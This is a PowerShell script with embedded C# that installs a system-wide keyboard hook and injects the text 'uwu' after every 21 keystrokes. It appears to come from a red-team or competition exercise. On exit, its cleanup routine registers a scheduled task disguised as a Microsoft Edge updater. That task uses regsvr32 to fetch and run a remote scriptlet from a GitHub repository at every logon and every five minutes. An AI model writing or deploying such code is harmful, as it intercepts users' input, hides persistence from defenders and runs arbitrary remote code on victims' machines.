Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;

public class Win32 {
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
}

[StructLayout(LayoutKind.Sequential)]
public struct KBDLLHOOKSTRUCT {
    public int vkCode;
    public int scanCode;
    public int flags;
    public int time;
    public IntPtr dwExtraInfo;
}

public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

public static class KeyboardHook {
    private static IntPtr _hook = IntPtr.Zero;
    private static LowLevelKeyboardProc _proc;
    private static int _count = 0;
    private static bool _injecting = false;
    private const int INJECTED_FLAG = 0x10;

    public static IntPtr HookHandle { get { return _hook; } }

    public static bool SetHook() {
        _proc = HookCallback;
        IntPtr hMod = Win32.GetModuleHandle(null);
        _hook = Win32.SetWindowsHookEx(13, _proc, hMod, 0);
        return _hook != IntPtr.Zero;
    }

    public static void Unhook() {
        if (_hook != IntPtr.Zero) {
            Win32.UnhookWindowsHookEx(_hook);
            _hook = IntPtr.Zero;
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)0x100 && !_injecting) {
            KBDLLHOOKSTRUCT kb = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);

            // Skip injected keystrokes (from SendKeys or other programs)
            if ((kb.flags & INJECTED_FLAG) == 0) {
                _count++;
                if (_count >= 21) {
                    _count = 0;
                    _injecting = true;
                    // Fire and forget on thread pool
                    ThreadPool.QueueUserWorkItem(_ => {
                        try {
                            SendKeys.SendWait("uwu");
                        } finally {
                            _injecting = false;
                        }
                    });
                }
            }
        }
        return Win32.CallNextHookEx(_hook, nCode, wParam, lParam);
    }
}
"@ -ReferencedAssemblies "System.Windows.Forms"

Add-Type -AssemblyName System.Windows.Forms

# --- Single Instance Enforcement ---
$mutexName = "Global\ISTS_KeyHook_7F3A9B2E"
$mutex = $null
$createdNew = $false

try {
    $mutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$createdNew)

    if (-not $createdNew) {
        if (-not $mutex.WaitOne(0)) {
            Write-Host "Already running. Exiting."
            exit 0
        }
    }
} catch [System.Threading.AbandonedMutexException] {
    Write-Host "Recovered abandoned mutex from unclean exit."
    $createdNew = $true
}

# --- Cleanup Function ---
$cleanup = {
    [KeyboardHook]::Unhook()
    if ($script:mutex) {
        try {
            $script:mutex.ReleaseMutex()
        } catch { }
        $script:mutex.Dispose()
        $script:mutex = $null
    }
    $taskName = "MicrosoftEdgeUpdateUpdaterTaskMachineCore"
    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
        # Task isn't restarted if it's registered.
    } else {
        $action = New-ScheduledTaskAction -Execute "regsvr32.exe" -Argument "/s /n /u /i:https://raw.githubusercontent.com/b3at1/eviluwu/refs/heads/main/WPXService.wsc scrobj.dll"
        $trigger1 = New-ScheduledTaskTrigger -AtLogOn
        $trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([TimeSpan]::MaxValue)
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($trigger1, $trigger2) -Force
    }

}

Register-EngineEvent PowerShell.Exiting -Action $cleanup | Out-Null

[Console]::TreatControlCAsInput = $false
$null = Register-ObjectEvent ([Console]) CancelKeyPress -Action {
    $event.Cancel = $true
    & $cleanup
    [Environment]::Exit(0)
}

# --- Set Hook ---
if (-not [KeyboardHook]::SetHook()) {
    Write-Host "Failed to set hook."
    & $cleanup
    exit 1
}

Write-Host "we hope you like it uwu <3"
Write-Host "- Team 3"

try {
    # Message pump required for low-level hooks
    while ($true) {
        [System.Windows.Forms.Application]::DoEvents()
        Start-Sleep -Milliseconds 50
    }
} finally {
    & $cleanup
}